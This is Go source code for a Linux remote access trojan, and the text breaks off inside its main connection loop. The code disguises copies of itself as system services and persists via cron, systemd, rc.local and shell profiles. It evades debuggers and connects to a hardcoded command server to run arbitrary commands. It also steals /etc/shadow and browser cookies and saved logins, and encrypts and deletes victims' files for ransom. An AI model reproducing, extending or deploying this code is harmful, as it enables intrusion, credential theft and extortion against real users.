//go:build linux

package main

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	currentPassword  = ""
	encryptedFiles   = make(map[string]string)
	encryptionKey    []byte
	stealthNames     = []string{"systemd-service", "update-manager", "security-agent", "network-monitor"}
	instanceMutex    sync.Mutex
	instanceLockFile = ""
)

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func createInstanceLock() bool {
	instanceMutex.Lock()
	defer instanceMutex.Unlock()

	lockFileName := fmt.Sprintf("client_%s_%d.lock", getHostname(), os.Getpid())
	instanceLockFile = filepath.Join("/tmp", lockFileName)

	file, err := os.OpenFile(instanceLockFile, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}

	fmt.Fprintf(file, "%d\n%s\n", os.Getpid(), time.Now().Format(time.RFC3339))
	file.Close()

	go func() {
		defer func() {
			if instanceLockFile != "" {
				os.Remove(instanceLockFile)
			}
		}()

		for {
			time.Sleep(30 * time.Second)
			if _, err := os.Stat(instanceLockFile); os.IsNotExist(err) {
				break
			}
			file, err := os.OpenFile(instanceLockFile, os.O_WRONLY|os.O_TRUNC, 0644)
			if err == nil {
				fmt.Fprintf(file, "%d\n%s\n", os.Getpid(), time.Now().Format(time.RFC3339))
				file.Close()
			}
		}
	}()

	return true
}

func isInstanceRunning() bool {
	pattern := "client_*_*.lock"
	searchDir := "/tmp"

	files, err := filepath.Glob(filepath.Join(searchDir, pattern))
	if err != nil || len(files) == 0 {
		return false
	}

	for _, file := range files {
		if file == instanceLockFile {
			continue
		}

		content, err := os.ReadFile(file)
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimSpace(string(content)), "\n")
		if len(lines) < 2 {
			continue
		}

		pidStr := strings.TrimSpace(lines[0])
		pid, err := strconv.Atoi(pidStr)
		if err != nil {
			continue
		}

		cmd := exec.Command("ps", "-p", fmt.Sprintf("%d", pid))
		output, err := cmd.Output()
		if err == nil && len(output) > 0 {
			return true
		}

		os.Remove(file)
	}

	return false
}

type SystemInfo struct {
	Hostname, MACAddress, Username string
}

type Command struct {
	Type, Content string
}

type Response struct {
	Type, Content string
}

func hideConsole() {
	// Linux doesn't need console hiding like Windows
}

func createStealthCopy() string {
	exePath, err := os.Executable()
	if err != nil {
		return ""
	}

	// Linux stealth paths - more legitimate locations
	linuxDirs := []string{"/usr/local/bin", "/opt", "/var/lib", "/tmp", "/home/" + os.Getenv("USER") + "/.local/bin"}
	for _, dir := range linuxDirs {
		for _, name := range stealthNames {
			stealthPath := filepath.Join(dir, name)
			if _, err := os.Stat(stealthPath); os.IsNotExist(err) {
				input, err := os.ReadFile(exePath)
				if err == nil {
					err = os.WriteFile(stealthPath, input, 0755)
					if err == nil {
						return stealthPath
					}
				}
			}
		}
	}
	return exePath
}

func addToStartup(stealthPath string) {
	cronEntry := fmt.Sprintf("@reboot %s\n", stealthPath)
	cmd := exec.Command("crontab", "-l")
	currentCron, _ := cmd.Output()
	if !strings.Contains(string(currentCron), stealthPath) {
		newCron := string(currentCron) + cronEntry
		cmd = exec.Command("crontab", "-")
		cmd.Stdin = strings.NewReader(newCron)
		cmd.Run()
	}
}

func isStealthMode() bool {
	exePath, _ := os.Executable()
	for _, name := range stealthNames {
		if strings.Contains(exePath, name) {
			return true
		}
	}
	return false
}

func checkDebugger() bool {
	// Linux debugger detection - check for common debuggers
	debuggers := []string{"gdb", "lldb", "strace", "ltrace"}
	for _, debugger := range debuggers {
		cmd := exec.Command("pgrep", debugger)
		if err := cmd.Run(); err == nil {
			return true
		}
	}
	return false
}

func enhancedPersistence(stealthPath string) {
	addToStartup(stealthPath)

	// Create systemd service
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target
[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=5
User=root
[Install]
WantedBy=multi-user.target`, stealthPath)
	os.WriteFile("/etc/systemd/system/system-update.service", []byte(serviceContent), 0644)
	exec.Command("systemctl", "enable", "system-update.service").Run()
	exec.Command("systemctl", "start", "system-update.service").Run()

	// Add to rc.local
	rcScript := fmt.Sprintf("#!/bin/sh\n%s &\n", stealthPath)
	os.WriteFile("/etc/rc.local", []byte(rcScript), 0755)

	// Add to user's .bashrc
	homeDir := os.Getenv("HOME")
	if homeDir != "" {
		bashrcPath := filepath.Join(homeDir, ".bashrc")
		bashrcContent := fmt.Sprintf("\n# Auto-start system service\n%s &\n", stealthPath)
		file, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			file.WriteString(bashrcContent)
			file.Close()
		}

		// Add to profile
		profilePath := filepath.Join(homeDir, ".profile")
		profileContent := fmt.Sprintf("\n# Auto-start system service\n%s &\n", stealthPath)
		file, err = os.OpenFile(profilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			file.WriteString(profileContent)
			file.Close()
		}
	}
}

func hideProcess() {
	// Set low priority on Linux
	syscall.Setpriority(syscall.PRIO_PROCESS, os.Getpid(), 10)
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		for {
			select {
			case <-c:
				if instanceLockFile != "" {
					os.Remove(instanceLockFile)
				}
				os.Exit(0)
			}
		}
	}()
}

func restartSelf() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exePath)
	cmd.Start()
}

func initStealthModeAsync() {
	if checkDebugger() {
		os.Exit(0)
	}

	hideProcess()
}

func sendData(conn net.Conn, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}
	_, err = conn.Write(jsonData)
	return err
}

func recvData(conn net.Conn) (string, error) {
	var buffer strings.Builder
	tempBuffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Time{})
	for {
		n, err := conn.Read(tempBuffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			return "", err
		}
		buffer.Write(tempBuffer[:n])
		data := buffer.String()
		if strings.HasSuffix(data, "}") || strings.HasSuffix(data, "\n") {
			var testResp Response
			if json.Unmarshal([]byte(data), &testResp) == nil {
				break
			}
		}
		if buffer.Len() > 1024*1024 {
			break
		}
	}
	return buffer.String(), nil
}

func downloadFile(conn net.Conn, filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	_, err = io.Copy(conn, file)
	return err
}

func uploadFile(conn net.Conn, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	conn.SetReadDeadline(time.Time{})
	sizeBytes := make([]byte, 8)
	_, err = io.ReadFull(conn, sizeBytes)
	if err != nil {
		return fmt.Errorf("failed to read file size: %v", err)
	}
	fileSize := int64(binary.LittleEndian.Uint64(sizeBytes))
	_, err = io.CopyN(file, conn, fileSize)
	if err != nil {
		return fmt.Errorf("failed to read file data: %v", err)
	}
	return nil
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getMACAddress() string {
	cmd := exec.Command("sh", "-c", "ip link show | grep -o -E '([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})' | head -1")
	output, err := cmd.Output()
	if err == nil {
		mac := strings.TrimSpace(string(output))
		if len(mac) == 17 && strings.Count(mac, ":") == 5 {
			return mac
		}
	}
	cmd = exec.Command("sh", "-c", "ifconfig | grep -o -E '([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})' | head -1")
	output, err = cmd.Output()
	if err == nil {
		mac := strings.TrimSpace(string(output))
		if len(mac) == 17 && strings.Count(mac, ":") == 5 {
			return mac
		}
	}
	return "00:00:00:00:00:00"
}

func getUsername() string {
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	if username == "" {
		cmd := exec.Command("whoami")
		output, err := cmd.Output()
		if err == nil {
			username = strings.TrimSpace(string(output))
		}
	}
	if username == "" {
		username = "unknown"
	}
	return username
}

func executeCommand(command string) string {
	cmd := exec.Command("nohup", "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		outputStr := string(output)
		outputLower := strings.ToLower(outputStr)
		if strings.Contains(outputLower, "not recognized") ||
			strings.Contains(outputLower, "invalid argument") ||
			strings.Contains(outputLower, "not found") ||
			strings.Contains(outputLower, "bad command") ||
			strings.Contains(outputLower, "invalid option") ||
			strings.Contains(outputLower, "usage:") ||
			strings.Contains(outputLower, "type") && strings.Contains(outputLower, "for usage") {
			return "Invalid command or argument"
		}
		return fmt.Sprintf("Command failed: %s", strings.TrimSpace(outputStr))
	}
	return string(output)
}

func takeLinuxScreenshot() string {
	// Try different screenshot tools available on Linux
	screenshotTools := []string{"gnome-screenshot", "import", "scrot", "xwd"}
	filename := fmt.Sprintf("screenshot_%d.png", time.Now().Unix())
	currentDir, err := os.Getwd()
	if err != nil {
		currentDir = "."
	}
	fullPath := filepath.Join(currentDir, filename)

	for _, tool := range screenshotTools {
		var cmd *exec.Cmd
		switch tool {
		case "gnome-screenshot":
			cmd = exec.Command("gnome-screenshot", "-f", fullPath)
		case "import":
			cmd = exec.Command("import", "-window", "root", fullPath)
		case "scrot":
			cmd = exec.Command("scrot", fullPath)
		case "xwd":
			cmd = exec.Command("xwd", "-root", "-out", fullPath+".xwd")
		}

		err = cmd.Run()
		if err == nil {
			if tool == "xwd" {
				// Convert xwd to png
				convertCmd := exec.Command("convert", fullPath+".xwd", fullPath)
				convertCmd.Run()
				os.Remove(fullPath + ".xwd")
			}
			return fmt.Sprintf("Screenshot saved as: %s", filename)
		}
	}

	return "Screenshot failed: No screenshot tool available (try installing gnome-screenshot, imagemagick, or scrot)"
}

func changeDirectory(path string) string {
	err := os.Chdir(path)
	if err != nil {
		return fmt.Sprintf("Error changing directory: %v", err)
	}
	currentDir, err := os.Getwd()
	if err != nil {
		return fmt.Sprintf("Directory changed, but couldn't get current path: %v", err)
	}
	return fmt.Sprintf("\nCurrent directory changed to: %s", currentDir)
}

func listDirectory(path string) string {
	var result strings.Builder

	// Get current directory if path is empty
	if path == "" {
		currentDir, err := os.Getwd()
		if err != nil {
			return fmt.Sprintf("Error getting current directory: %v", err)
		}
		path = currentDir
	}

	// Read directory contents
	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("Error reading directory %s: %v", path, err)
	}

	result.WriteString(fmt.Sprintf("Directory: %s\n", path))
	result.WriteString("Type\tName\t\t\tSize\t\tModified\n")
	result.WriteString(strings.Repeat("-", 80) + "\n")

	// Sort entries: directories first, then files
	var dirs []os.DirEntry
	var files []os.DirEntry

	for _, entry := range entries {
		if entry.IsDir() {
			dirs = append(dirs, entry)
		} else {
			files = append(files, entry)
		}
	}

	// Add directories first
	for _, dir := range dirs {
		info, err := dir.Info()
		if err != nil {
			continue
		}
		result.WriteString(fmt.Sprintf("<DIR>\t%-30s\t%s\t\t%s\n",
			dir.Name(),
			"<DIR>",
			info.ModTime().Format("2006-01-02 15:04:05")))
	}

	// Add files
	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}

		size := formatFileSize(info.Size())
		result.WriteString(fmt.Sprintf("FILE\t%-30s\t%-10s\t%s\n",
			file.Name(),
			size,
			info.ModTime().Format("2006-01-02 15:04:05")))
	}

	return result.String()
}

func formatFileSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func getCurrentDirectory() string {
	dir, err := os.Getwd()
	if err != nil {
		return "."
	}
	return dir
}

func generateEncryptionKey(password string) []byte {
	hash := sha256.Sum256([]byte(password))
	return hash[:]
}

func encryptFile(filepath string, password string) string {
	content, err := os.ReadFile(filepath)
	if err != nil {
		return fmt.Sprintf("Failed to read file: %v", err)
	}
	key := generateEncryptionKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Sprintf("Failed to create cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Sprintf("Failed to create GCM: %v", err)
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return fmt.Sprintf("Failed to create nonce: %v", err)
	}
	ciphertext := gcm.Seal(nonce, nonce, content, nil)
	encryptedPath := filepath + ".encrypted"
	err = os.WriteFile(encryptedPath, ciphertext, 0644)
	if err != nil {
		return fmt.Sprintf("Failed to save encrypted file: %v", err)
	}
	encryptedFiles[filepath] = encryptedPath
	os.Remove(filepath)
	return fmt.Sprintf("File encrypted: %s -> %s", filepath, encryptedPath)
}

func decryptFile(filepath string, password string) string {
	encryptedPath := filepath + ".encrypted"
	if _, err := os.Stat(encryptedPath); os.IsNotExist(err) {
		return "Encrypted file not found"
	}
	ciphertext, err := os.ReadFile(encryptedPath)
	if err != nil {
		return fmt.Sprintf("Failed to read encrypted file: %v", err)
	}
	key := generateEncryptionKey(password)
	block, err := aes.NewCipher(key)
	if err != nil {
		return fmt.Sprintf("Failed to create cipher: %v", err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return fmt.Sprintf("Failed to create GCM: %v", err)
	}
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "Invalid encrypted file"
	}
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return fmt.Sprintf("Decryption failed: %v", err)
	}
	err = os.WriteFile(filepath, plaintext, 0644)
	if err != nil {
		return fmt.Sprintf("Failed to save decrypted file: %v", err)
	}
	os.Remove(encryptedPath)
	delete(encryptedFiles, filepath)
	return fmt.Sprintf("File decrypted: %s", filepath)
}

func encryptDirectory(dirPath string, password string) string {
	var results []string
	var totalFiles, encryptedFiles int
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() || strings.HasPrefix(info.Name(), ".") ||
			strings.HasSuffix(path, ".encrypted") || strings.Contains(path, "System32") ||
			strings.Contains(path, "Windows") {
			return nil
		}
		if strings.HasSuffix(strings.ToLower(path), ".exe") ||
			strings.HasSuffix(strings.ToLower(path), ".dll") ||
			strings.HasSuffix(strings.ToLower(path), ".so") {
			return nil
		}
		totalFiles++
		result := encryptFile(path, password)
		if strings.Contains(result, "File encrypted") {
			encryptedFiles++
		}
		results = append(results, result)
		return nil
	})
	if err != nil {
		return fmt.Sprintf("Error walking directory: %v", err)
	}
	summary := fmt.Sprintf("Directory encryption complete!\nTotal files: %d\nEncrypted: %d\nFailed: %d",
		totalFiles, encryptedFiles, totalFiles-encryptedFiles)
	return summary + "\n\n" + strings.Join(results, "\n")
}

func decryptDirectory(dirPath string, password string) string {
	var results []string
	var totalFiles, decryptedFiles int
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !strings.HasSuffix(path, ".encrypted") {
			return nil
		}
		totalFiles++
		originalPath := strings.TrimSuffix(path, ".encrypted")
		result := decryptFile(originalPath, password)
		if strings.Contains(result, "File decrypted") {
			decryptedFiles++
		}
		results = append(results, result)
		return nil
	})
	if err != nil {
		return fmt.Sprintf("Error walking directory: %v", err)
	}
	summary := fmt.Sprintf("Directory decryption complete!\nTotal encrypted files: %d\nDecrypted: %d\nFailed: %d",
		totalFiles, decryptedFiles, totalFiles-decryptedFiles)
	return summary + "\n\n" + strings.Join(results, "\n")
}

func setPassword(newPassword string) string {
	currentPassword = newPassword
	encryptionKey = generateEncryptionKey(newPassword)
	return fmt.Sprintf("Password set successfully: %s", newPassword)
}

func getPassword() string {
	if currentPassword == "" {
		return "No password set"
	}
	return fmt.Sprintf("Current password: %s", currentPassword)
}

func listEncryptedFiles() string {
	if len(encryptedFiles) == 0 {
		return "No encrypted files found"
	}
	var result strings.Builder
	result.WriteString("Encrypted files:\n")
	for original, encrypted := range encryptedFiles {
		result.WriteString(fmt.Sprintf("  %s -> %s\n", original, encrypted))
	}
	return result.String()
}

func getBrowserProfiles() []string {
	var profiles []string

	chromePaths := []string{
		filepath.Join(os.Getenv("HOME"), ".config", "google-chrome"),
		filepath.Join(os.Getenv("HOME"), ".config", "chromium"),
	}

	for _, chromePath := range chromePaths {
		if _, err := os.Stat(chromePath); err == nil {
			profiles = append(profiles, filepath.Join(chromePath, "Default"))
			profileDirs, _ := filepath.Glob(filepath.Join(chromePath, "Profile *"))
			profiles = append(profiles, profileDirs...)
		}
	}

	firefoxPaths := []string{
		filepath.Join(os.Getenv("HOME"), ".mozilla", "firefox"),
	}

	for _, firefoxPath := range firefoxPaths {
		if _, err := os.Stat(firefoxPath); err == nil {
			firefoxDirs, _ := filepath.Glob(filepath.Join(firefoxPath, "*"))
			for _, dir := range firefoxDirs {
				if info, err := os.Stat(dir); err == nil && info.IsDir() {
					profiles = append(profiles, dir)
				}
			}
		}
	}

	return profiles
}

func copyFileToZip(zipWriter *zip.Writer, srcPath, destPath string) error {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	destFile, err := zipWriter.Create(destPath)
	if err != nil {
		return err
	}

	_, err = io.Copy(destFile, srcFile)
	return err
}

func extractBrowserData() string {
	tempDir := filepath.Join(os.TempDir(), fmt.Sprintf("tmp_%d", time.Now().UnixNano()))
	os.MkdirAll(tempDir, 0755)
	defer os.RemoveAll(tempDir)

	zipPath := filepath.Join(os.TempDir(), fmt.Sprintf("~%d.tmp", time.Now().UnixNano()))
	zipFile, err := os.Create(zipPath)
	if err != nil {
		return fmt.Sprintf("Failed to create zip file: %v", err)
	}
	defer zipFile.Close()
	defer os.Remove(zipPath)

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	profiles := getBrowserProfiles()
	var extractedFiles []string

	for _, profilePath := range profiles {
		if _, err := os.Stat(profilePath); os.IsNotExist(err) {
			continue
		}

		profileName := filepath.Base(profilePath)
		if profileName == "" {
			profileName = "Default"
		}

		cookieFiles := []string{
			"Cookies",
			"Network/Cookies",
			"cookies.sqlite",
			"cookies.sqlite-wal",
			"cookies.sqlite-shm",
		}

		for _, cookieFile := range cookieFiles {
			srcPath := filepath.Join(profilePath, cookieFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, cookieFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		loginFiles := []string{
			"Login Data",
			"logins.json",
			"key4.db",
			"key3.db",
			"cert9.db",
		}

		for _, loginFile := range loginFiles {
			srcPath := filepath.Join(profilePath, loginFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, loginFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		historyFiles := []string{
			"History",
			"places.sqlite",
			"Web Data",
		}

		for _, historyFile := range historyFiles {
			srcPath := filepath.Join(profilePath, historyFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, historyFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		bookmarkFiles := []string{
			"Bookmarks",
			"bookmarks.json",
		}

		for _, bookmarkFile := range bookmarkFiles {
			srcPath := filepath.Join(profilePath, bookmarkFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/%s", profileName, bookmarkFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}

		autofillFiles := []string{
			"Web Data",
			"formhistory.sqlite",
		}

		for _, autofillFile := range autofillFiles {
			srcPath := filepath.Join(profilePath, autofillFile)
			if _, err := os.Stat(srcPath); err == nil {
				destPath := fmt.Sprintf("%s/autofill_%s", profileName, autofillFile)
				if err := copyFileToZip(zipWriter, srcPath, destPath); err == nil {
					extractedFiles = append(extractedFiles, destPath)
				}
			}
		}
	}

	if len(extractedFiles) == 0 {
		return "No browser data found to extract"
	}

	zipWriter.Close()
	zipFile.Close()

	time.Sleep(100 * time.Millisecond)

	finalPath := filepath.Join(os.TempDir(), fmt.Sprintf("browser_data_%d.zip", time.Now().UnixNano()))
	err = os.Rename(zipPath, finalPath)
	if err != nil {
		srcFile, err2 := os.Open(zipPath)
		if err2 != nil {
			return fmt.Sprintf("Failed to move zip file: %v", err)
		}
		defer srcFile.Close()

		dstFile, err2 := os.Create(finalPath)
		if err2 != nil {
			return fmt.Sprintf("Failed to create final zip file: %v", err2)
		}
		defer dstFile.Close()

		_, err2 = io.Copy(dstFile, srcFile)
		if err2 != nil {
			return fmt.Sprintf("Failed to copy zip file: %v", err2)
		}

		os.Remove(zipPath)
	}

	pathRefFile := filepath.Join(os.TempDir(), fmt.Sprintf("~browser_paths_%d.txt", time.Now().UnixNano()))
	pathContent := fmt.Sprintf("Browser Data Extraction Results\n================================\n\nZIP File Location: %s\n\nExtracted Files (%d):\n%s\n\nExtraction Time: %s\n\nNote: This file will be automatically deleted after 24 hours.",
		finalPath, len(extractedFiles), strings.Join(extractedFiles, "\n"), time.Now().Format("2006-01-02 15:04:05"))
	os.WriteFile(pathRefFile, []byte(pathContent), 0644)

	go func() {
		time.Sleep(24 * time.Hour)
		os.Remove(finalPath)
		os.Remove(pathRefFile)
	}()

	return fmt.Sprintf("Browser data extracted successfully!\n\n📁 ZIP FILE LOCATION:\n%s\n\n📄 PATH REFERENCE FILE:\n%s\n\n📊 EXTRACTION SUMMARY:\nFiles extracted: %d\n\n📋 EXTRACTED FILES:\n%s\n\n💡 TIP: You can access the zip file at the path above to view all browser data",
		finalPath, pathRefFile, len(extractedFiles), strings.Join(extractedFiles, "\n"))
}

func getRecentExtractionPaths() string {
	var paths []string

	tempDir := os.TempDir()
	files, err := filepath.Glob(filepath.Join(tempDir, "~*_paths_*.txt"))
	if err != nil {
		return "No recent extraction paths found"
	}

	for _, file := range files {
		content, err := os.ReadFile(file)
		if err == nil {
			paths = append(paths, fmt.Sprintf("📄 %s\n%s", file, string(content)))
		}
	}

	if len(paths) == 0 {
		return "No recent extraction paths found"
	}

	return fmt.Sprintf("Recent Browser Data Extraction Paths:\n%s", strings.Join(paths, "\n\n"))
}

func getServerHost() string {
	// Prefer environment variable C2_HOST; fallback to your no-IP domain
	if host := os.Getenv("C2_HOST"); strings.TrimSpace(host) != "" {
		return strings.TrimSpace(host)
	}
	return "milauth-mygovin.serveftp.com"
}

func getServerPort() int {
	if p := strings.TrimSpace(os.Getenv("C2_PORT")); p != "" {
		if v, err := strconv.Atoi(p); err == nil && v > 0 && v < 65536 {
			return v
		}
	}
	return 2026
}

func handleCommand(command string, conn net.Conn) {
	if command == "q" {
		return
	} else if strings.HasPrefix(command, "upload ") {
		filename := strings.TrimPrefix(command, "upload ")
		response := Response{Type: "response", Content: "ready"}
		sendData(conn, response)
		err := uploadFile(conn, filename)
		if err != nil {
			response = Response{Type: "response", Content: fmt.Sprintf("Upload %s: Failed - %v", filename, err)}
			sendData(conn, response)
		}
	} else if strings.HasPrefix(command, "download ") {
		filename := strings.TrimPrefix(command, "download ")
		err := downloadFile(conn, filename)
		if err != nil {
			response := Response{Type: "response", Content: fmt.Sprintf("Download %s: Failed - %v", filename, err)}
			sendData(conn, response)
		}
	} else if command == "kill" {
		conn.Close()
		return
	} else if command == "sysinfo" {
		result := fmt.Sprintf("Hostname: %s\nUsername: %s\nMAC Address: %s\nOS: %s\nArchitecture: %s",
			getHostname(), getUsername(), getMACAddress(), runtime.GOOS, runtime.GOARCH)
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "processes" {
		result := executeCommand("ps aux")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "services" {
		result := executeCommand("systemctl list-units --type=service --state=running")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "network" {
		result := executeCommand("ip addr show && route -n")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "screenshot" {
		result := takeLinuxScreenshot()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "registry" {
		result := "Registry is Windows-specific. Use 'config' command for Linux configuration files."
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "startup" {
		result := executeCommand("systemctl list-unit-files --type=service --state=enabled")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "firewall" {
		result := executeCommand("ufw status verbose || iptables -L -n")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "antivirus" {
		result := executeCommand("ps aux | grep -i antivirus || ps aux | grep -i clam || echo 'No antivirus detected'")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "config" {
		// Linux-specific configuration files
		var result strings.Builder
		result.WriteString("=== Linux Configuration Files ===\n")
		configFiles := []string{
			"/etc/passwd",
			"/etc/shadow",
			"/etc/group",
			"/etc/hosts",
			"/etc/resolv.conf",
			"/etc/fstab",
			"/etc/crontab",
		}
		for _, file := range configFiles {
			if content, err := os.ReadFile(file); err == nil {
				result.WriteString(fmt.Sprintf("\n--- %s ---\n", file))
				contentStr := string(content)
				if len(contentStr) > 500 {
					result.WriteString(contentStr[:500])
					result.WriteString("\n... (truncated)")
				} else {
					result.WriteString(contentStr)
				}
			}
		}
		response := Response{Type: "response", Content: result.String()}
		sendData(conn, response)
	} else if strings.HasPrefix(command, "setpass ") {
		password := strings.TrimPrefix(command, "setpass ")
		result := setPassword(password)
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "getpass" {
		result := getPassword()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, "encrypt ") {
		path := strings.TrimPrefix(command, "encrypt ")
		if currentPassword == "" {
			response := Response{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
			sendData(conn, response)
		} else {
			var result string
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result = encryptDirectory(path, currentPassword)
			} else {
				result = encryptFile(path, currentPassword)
			}
			response := Response{Type: "response", Content: result}
			sendData(conn, response)
		}
	} else if strings.HasPrefix(command, "decrypt ") {
		path := strings.TrimPrefix(command, "decrypt ")
		if currentPassword == "" {
			response := Response{Type: "response", Content: "No password set. Use 'setpass <password>' first."}
			sendData(conn, response)
		} else {
			var result string
			if info, err := os.Stat(path); err == nil && info.IsDir() {
				result = decryptDirectory(path, currentPassword)
			} else {
				result = decryptFile(path, currentPassword)
			}
			response := Response{Type: "response", Content: result}
			sendData(conn, response)
		}
	} else if command == "listencrypted" {
		result := listEncryptedFiles()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "extractbrowser" {
		result := extractBrowserData()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "browserpaths" {
		result := getRecentExtractionPaths()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "ls" || command == "dir" {
		result := listDirectory("")
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, "ls ") {
		path := strings.TrimPrefix(command, "ls ")
		result := listDirectory(path)
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if strings.HasPrefix(command, "dir ") {
		path := strings.TrimPrefix(command, "dir ")
		result := listDirectory(path)
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "pwd" {
		result := getCurrentDirectory()
		response := Response{Type: "response", Content: result}
		sendData(conn, response)
	} else if command == "cd .." {
		result := changeDirectory("..")
		response := Response{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	} else if strings.HasPrefix(command, "cd ") {
		path := strings.TrimPrefix(command, "cd ")
		result := changeDirectory(path)
		response := Response{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	} else {
		result := executeCommand(command)
		response := Response{Type: "response", Content: result}
		err := sendData(conn, response)
		if err != nil {
			return
		}
	}
}

func handleShellWithPersistence(conn net.Conn) {
	sysInfo := SystemInfo{
		Hostname:   getHostname(),
		MACAddress: getMACAddress(),
		Username:   getUsername(),
	}
	err := sendData(conn, sysInfo)
	if err != nil {
		return
	}
	for {
		command, err := recvData(conn)
		if err != nil {
			return
		}
		var cmd Command
		err = json.Unmarshal([]byte(command), &cmd)
		if err != nil {
			cmd = Command{Type: "command", Content: strings.TrimSpace(command)}
		}
		switch cmd.Type {
		case "heartbeat":
			continue
		case "command":
			handleCommand(strings.TrimSpace(cmd.Content), conn)
		}
	}
}

func main() {
	// Check if another instance is already running
	if isInstanceRunning() {
		// Another instance is running, exit silently
		os.Exit(0)
	}

	// Try to create instance lock
	if !createInstanceLock() {
		// Failed to create lock, another instance might be starting
		time.Sleep(1 * time.Second)
		if isInstanceRunning() {
			os.Exit(0)
		}
		// Try one more time
		if !createInstanceLock() {
			os.Exit(0)
		}
	}

	hideConsole()

	initStealthModeAsync()

	serverPort := getServerPort()
	setupSignalHandler()

	for {
		// Resolve server host and connect
		serverHost := getServerHost()
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", serverHost, serverPort))
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		conn.SetDeadline(time.Time{})
